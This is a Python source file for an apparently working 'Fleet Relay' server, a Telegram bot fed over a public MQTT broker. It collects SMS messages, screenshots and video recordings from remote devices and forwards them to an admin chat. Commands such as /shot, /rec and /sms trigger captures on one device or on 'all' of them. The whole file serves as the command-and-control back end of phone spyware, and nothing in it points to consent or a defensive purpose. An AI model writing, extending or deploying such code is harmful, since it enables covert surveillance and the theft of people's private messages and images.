import os, io, json, base64, asyncio, logging, time
from flask import Flask, request
from telegram import Update
import paho.mqtt.client as mqtt
import redis.asyncio as redis
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("relay")

TG_TOKEN  = os.environ.get("TG_TOKEN", "")
ADMIN     = int(os.environ.get("TG_ADMIN_CHAT", "0"))
REDIS_URL = os.environ.get("REDIS_URL", "")
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://fleet-relay-kwxm.onrender.com")

R = redis.from_url(REDIS_URL, decode_responses=False)
application = ApplicationBuilder().token(TG_TOKEN).build()

flask_app = Flask(__name__)
MQ = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
VIDEO_BUF = {}
LOOP = None

def _split_topic(topic: str):
    p = topic.split("/")
    return (p[1], p[2]) if len(p) == 3 else (None, None)

def on_connect(client, userdata, flags, rc, props=None):
    log.info(f"mqtt connected rc={rc}")
    client.subscribe("fleet/+/event", qos=1)
    client.subscribe("fleet/+/blob", qos=0)

def _emit_video(dev, msg_id):
    buf = VIDEO_BUF.pop(msg_id, None)
    if not buf or len(buf["chunks"]) != buf["total"]: return
    buf["chunks"].sort(key=lambda x: x[0])
    data = b"".join(c for _, c in buf["chunks"])
    asyncio.run_coroutine_threadsafe(application.bot.send_video(ADMIN, video=io.BytesIO(data), caption=f"[{dev}] {buf.get('duration', 0)}s"), LOOP)

def on_message(client, userdata, msg):
    try:
        dev, sub = _split_topic(msg.topic)
        if not dev or LOOP is None: return
        if sub == "event":
            payload = json.loads(msg.payload)
            kind = payload.get("kind")
            asyncio.run_coroutine_threadsafe(R.set(f"dev:{dev}:last", str(int(time.time()))), LOOP)
            if kind == "sms":
                text = f"[{dev}] SMS from {payload.get('from')}\n{payload.get('body')}"
                asyncio.run_coroutine_threadsafe(R.lpush(f"dev:{dev}:sms", text), LOOP)
                asyncio.run_coroutine_threadsafe(application.bot.send_message(ADMIN, text), LOOP)
            elif kind == "screenshot":
                data = base64.b64decode(payload["data"])
                asyncio.run_coroutine_threadsafe(application.bot.send_photo(ADMIN, photo=io.BytesIO(data), caption=f"[{dev}] screenshot"), LOOP)
            elif kind == "video_meta":
                VIDEO_BUF[payload["msgId"]] = {"chunks": [], "total": payload["chunks"], "duration": payload.get("duration", 0)}
            elif kind == "hello":
                asyncio.run_coroutine_threadsafe(application.bot.send_message(ADMIN, f"device online: {dev}"), LOOP)
        elif sub == "blob" and len(msg.payload) >= 4:
            hlen = (msg.payload[0] << 24) | (msg.payload[1] << 16) | (msg.payload[2] << 8) | msg.payload[3]
            hdr = json.loads(msg.payload[4:4 + hlen])
            buf = VIDEO_BUF.get(hdr["msgId"])
            if buf:
                buf["chunks"].append((hdr["idx"], bytes(msg.payload[4 + hlen:])))
                if len(buf["chunks"]) == buf["total"]: _emit_video(dev, hdr["msgId"])
    except Exception as e:
        log.warning(f"mqtt msg fail: {e}")

MQ.on_connect = on_connect
MQ.on_message = on_message

async def scan_keys(pattern):
    cur, out = 0, []
    while True:
        cur, keys = await R.scan(cur, match=pattern, count=500)
        out.extend(keys)
        if cur == 0: return out

async def list_devices():
    keys = await scan_keys("dev:*:last")
    out = [(k.decode().split(":")[1], int((await R.get(f"dev:{k.decode().split(':')[1]}:last")) or 0)) for k in keys]
    return sorted(out)

def publish_cmd(dev, obj):
    MQ.publish(f"fleet/{dev}/cmd", json.dumps(obj), qos=1)

async def cmd_start(update: Update, _: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("/devices\n/shot <dev|all>\n/rec <dev|all> <sec>\n/sms <dev>")

async def cmd_devices(update: Update, _: ContextTypes.DEFAULT_TYPE):
    devs = await list_devices()
    if not devs: return await update.message.reply_text("no devices yet")
    now = int(time.time())
    await update.message.reply_text("\n".join(f"• {d} — {now - t}s ago" for d, t in devs))

async def _targets(arg):
    devs = [d for d, _ in await list_devices()]
    return devs if arg == "all" else [arg]

async def cmd_shot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: return
    for d in await _targets(ctx.args[0]): publish_cmd(d, {"action": "screenshot", "quality": 80})
    await update.message.reply_text("queued screenshot")

async def cmd_rec(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args) != 2: return
    try: sec = int(ctx.args[1])
    except: return await update.message.reply_text("seconds must be number")
    for d in await _targets(ctx.args[0]): publish_cmd(d, {"action": "record", "duration": sec})
    await update.message.reply_text(f"queued {sec}s record")

async def cmd_sms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: return
    raw = await R.lrange(f"dev:{ctx.args[0]}:sms", 0, 19)
    await update.message.reply_text("\n---\n".join(x.decode() for x in raw)[:4000] or "empty")

application.add_handler(CommandHandler("start", cmd_start))
application.add_handler(CommandHandler("devices", cmd_devices))
application.add_handler(CommandHandler("shot", cmd_shot))
application.add_handler(CommandHandler("rec", cmd_rec))
application.add_handler(CommandHandler("sms", cmd_sms))

@flask_app.route(f"/{TG_TOKEN}", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    asyncio.run_coroutine_threadsafe(application.process_update(update), LOOP)
    return "ok"

@flask_app.route("/")
def index(): return "Fleet Relay is running"

def main():
    global LOOP
    LOOP = asyncio.new_event_loop()
    asyncio.set_event_loop(LOOP)

    LOOP.run_until_complete(application.initialize())
    LOOP.run_until_complete(application.start())
    
    # পাবলিক MQTT ব্রোকারে কানেক্ট করা হচ্ছে
    MQ.connect("broker.hivemq.com", 1883, 60)
    MQ.loop_start()

    LOOP.run_until_complete(application.bot.set_webhook(url=f"{RENDER_URL}/{TG_TOKEN}"))
    log.info(f"Webhook set to {RENDER_URL}/{TG_TOKEN}")

    flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))

if __name__ == "__main__":
    main()